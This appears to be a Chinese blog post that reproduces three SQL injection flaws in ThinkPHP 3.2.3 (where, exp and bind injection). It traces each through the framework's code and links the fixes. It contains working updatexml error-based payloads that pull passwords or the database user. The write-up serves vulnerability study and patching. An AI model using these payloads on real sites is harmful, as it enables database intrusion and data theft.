---
title: "ThinkPhp3漏洞总结"
date: 2020-02-06T17:47:24+08:00
draft: flase
tags: [漏洞复现]
categories: []
comment: true
---
ThinkPhp3漏洞总结
<!--more-->
# ThinkPhp3漏洞总结

## 环境搭建

- 下载源码


![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227170830.png)

- 编辑器使用了phpstrom

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227171652.png)

- 配置数据库

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227172147.png)

- 添加测试数据

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227181617.png)

## Thinkphp3.2.3 where注入

- payload

```
?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```

- 断点

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227210620.png)

### 分析

- 经过htmlspecialchars过滤

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227213305.png)

- 于442行通过think_filter函数进行过滤

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227213938.png)

- 经过ThinkPHP/Library/Think/Model.class.php:779的find()方法

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227215603.png)

- 满足条件则进入

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227221704.png)

- 强制进行转换，转换为了int形

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227222201.png)

- 带入查询

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227222618.png)

- 步骤

```
id=1' -> I() -> find() -> __parseOptions(） ->_parseType()
```

**满足条件才能进去__parseOptions()方法**

- 条件

```
if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join']))
```

- 绕过

```
index.php?id[where]=3 and 1=1
```

### 修复

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200227223224.png)


## Thinkphp 3.2.3 exp注入

- 部署环境

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228132814.png)

- payload

```
http://localhost:8888/tp3/index.php?username[0]=exp&username[1]==1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228140738.png)

### 分析
- 进入Model.class.php的822行$this->select($options)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228142850.png)

- 跟进select方法

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228143015.png)

- 跟踪Driver.class.php中的parseSql方法

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228143524.png)

- 跟踪Driver.class.php中的parseWhere方法

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228152545.png)

- 经过$whereStr .= $this->parseWhereItem($this->parseKey($key), $val)方法，跟踪进去

```
需要时数组才可以进去if语句
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228153342.png)

- 语句exp直接拼接构成注入

```
 } elseif ('bind' == $exp) {
                    // 使用表达式
 $whereStr .= $key . ' = :' . $val[1];
```

### 修复

使用I方法接受会通过think_filter函数进行过滤

## thinkphp 3.2.3 bind注入

- payload

```
index.php?id[0]=bind&id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&password=1
```
- 环境部署

```
    public function index()
    {
        $User = M("Users");
        $user['id'] = I('id');
        $data['password'] = I('password');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
```

**上文说到除了exp还有bind可以进行注入**

- 报错

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228163022.png)

- 进入update方法

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228163643.png)

- 进入到了parseWhereItem方法（bind可以注入）

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228164149.png)

- 于函数bindParam进行了添加冒号

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228172421.png)

- 在Driver.class.php文件execute中进行冒号替换

```
if (!empty($this->bind)) {
            $that           = $this;
            $this->queryStr = strtr($this->queryStr, array_map(function ($val) use ($that) {return '\'' . $that->escapeString($val) . '\'';}, $this->bind));
}
```
- 如果payload不是0的话

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228231232.png)

### 修复

```
https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200228175421.png)